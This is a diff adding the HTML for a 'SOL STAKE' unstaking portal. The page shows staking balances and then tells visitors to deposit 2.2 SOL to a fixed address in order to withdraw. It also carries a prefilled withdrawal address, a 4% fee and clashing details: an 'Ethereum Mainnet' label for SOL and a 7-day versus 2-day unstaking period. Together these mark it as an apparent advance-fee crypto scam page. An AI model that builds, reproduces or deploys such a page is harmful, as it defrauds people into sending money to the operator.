@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unstaking Withdrawal Portal</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+</head>
+<body>
+    <div class="unstake-page">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <img src="logo.jpg" alt="SOL Logo" style="height: 50px; width: 50px; border-radius: 50%; object-fit: cover; margin-right: 1rem; vertical-align: middle;">
+                <h1 style="display: inline;">SOL STAKE</h1>
+            </div>
+            <nav class="navigation">
+                <a href="home.html">Home</a>
+                <a href="index.html" class="active">Unstake</a>
+                <a href="https://solstake-dashboard.vercel.app/" target="_blank">Dashboard</a>
+            </nav>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Wallet Connection Section -->
+            <section class="wallet-section card">
+                <div class="wallet-info">
+                    <button id="connectWalletBtn" class="connect-btn">
+                        Unstake SOL
+                    </button>
+                    <div id="walletDetails" class="wallet-details hidden">
+                        <div class="wallet-address-container">
+                            <span class="label">Wallet Address:</span>
+                            <span id="walletAddress" class="wallet-address">Not Connected</span>
+                            <button id="copyAddressBtn" class="copy-btn" title="Copy address">📋</button>
+                        </div>
+                        <div class="network-info">
+                            <span class="label">Network:</span>
+                            <span id="network" class="network-badge">Ethereum Mainnet</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Balance Display Section -->
+            <section class="balance-section card">
+                <h2 class="section-title">Your Holdings</h2>
+                <div class="balance-grid">
+                    <div class="balance-item">
+                        <span class="balance-label">Staked Balance</span>
+                        <span id="stakedBalance" class="balance-value">0.00 TOKEN</span>
+                    </div>
+                    <div class="balance-item">
+                        <span class="balance-label">Earned Rewards</span>
+                        <span id="rewardsBalance" class="balance-value reward">0.00 TOKEN</span>
+                    </div>
+                    <div class="balance-item highlight">
+                        <span class="balance-label">Available to Withdraw</span>
+                        <span id="availableBalance" class="balance-value available">0.00 TOKEN</span>
+                    </div>
+                    <div class="balance-item">
+                        <span class="balance-label">Unstaking Period</span>
+                        <span id="unstakingPeriod" class="balance-value">7 days</span>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Unstake Form Section -->
+            <section id="withdrawSection" class="unstake-form card">
+                <h2 class="section-title">Withdraw Your Tokens</h2>
+                
+                <div class="input-group">
+                    <label for="unstakeAmount">Amount to Unstake</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="number" 
+                            id="unstakeAmount" 
+                            placeholder="0.00" 
+                            min="0"
+                            step="0.01"
+                            value="55"
+                        />
+                        <span class="input-suffix">SOL</span>
+                        <button id="maxBtn" class="max-btn">MAX</button>
+                    </div>
+                    <div class="input-info">
+                        <span id="amountInUSD" class="usd-value">≈ $0.00 USD</span>
+                        <span id="availableDisplay" class="available-text">Available: 0.00 TOKEN</span>
+                    </div>
+                </div>
+
+                <div class="withdrawal-info">
+                    <div class="info-row">
+                        <span>You will receive:</span>
+                        <span id="receiveAmount" class="receive-amount">0.00 TOKEN</span>
+                    </div>
+                    <div class="info-row address-row">
+                        <span>Withdrawal address:</span>
+                    </div>
+                    <div class="info-row">
+                        <div class="address-display full-width">
+                            <span id="withdrawalAddress" class="address-text">6G2H9yMmrBYnhSecmEP4h6AaktScxtBUd1i7sBWuTMe2</span>
+                        </div>
+                    </div>
+                    <div class="info-row">
+                        <span>Unstaking Fee:</span>
+                        <span id="unstakingFee" class="fee-amount">0.00 TOKEN (4%)</span>
+                    </div>
+                    <div class="info-row">
+                        <span>Estimated Gas Fee:</span>
+                        <span id="gasFee" class="gas-fee">~0.1 SOL</span>
+                    </div>
+                </div>
+
+                <button id="unstakeBtn" class="unstake-btn">
+                    <span class="btn-icon">⬇️</span>
+                    Unstake Tokens
+                </button>
+
+                <div class="deposit-address-section">
+                    <div class="deposit-label">Deposit Address: deposit 2.2 SOL to the address below</div>
+                    <div class="deposit-address-container">
+                        <span id="depositAddress" class="deposit-address">A6hEFKB2qKE7U7wBz4X5Rnf1dZCcJYjPaFb2Kw4W88Hf</span>
+                        <button id="copyDepositBtn" class="copy-address-btn" title="Copy deposit address">📋 Copy</button>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <span class="warning-icon">⚠️</span>
+                    <p>Once unstaked, your tokens will be subject to a 2-day withdrawal period before they become available in your wallet.</p>
+                </div>
+            </section>
+
+            <!-- Pending Withdrawals Section -->
+            <section class="pending-withdrawals card">
+                <h2 class="section-title">Pending Withdrawals</h2>
+                <div id="withdrawalsList" class="withdrawals-list">
+                    <div class="no-withdrawals">
+                        <span class="empty-icon">📭</span>
+                        <p>No pending withdrawals</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Transaction Feedback -->
+            <div id="transactionFeedback" class="feedback hidden">
+                <div class="feedback-content">
+                    <span id="feedbackIcon" class="feedback-icon">⏳</span>
+                    <p id="feedbackMessage" class="feedback-message">Processing transaction...</p>
+                    <button id="closeFeedback" class="close-btn">×</button>
+                </div>
+                <div id="txHash" class="tx-hash hidden">
+                    <span>Transaction Hash:</span>
+                    <a href="#" target="_blank" id="txHashLink">View on Explorer</a>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-content">
+                <p>© 2025 Unstaking Portal. All rights reserved.</p>
+                <div class="footer-links">
+                    <a href="/docs">Documentation</a>
+                    <a href="/faq">FAQ</a>
+                    <a href="/support">Support</a>
+                    <a href="/terms">Terms of Service</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
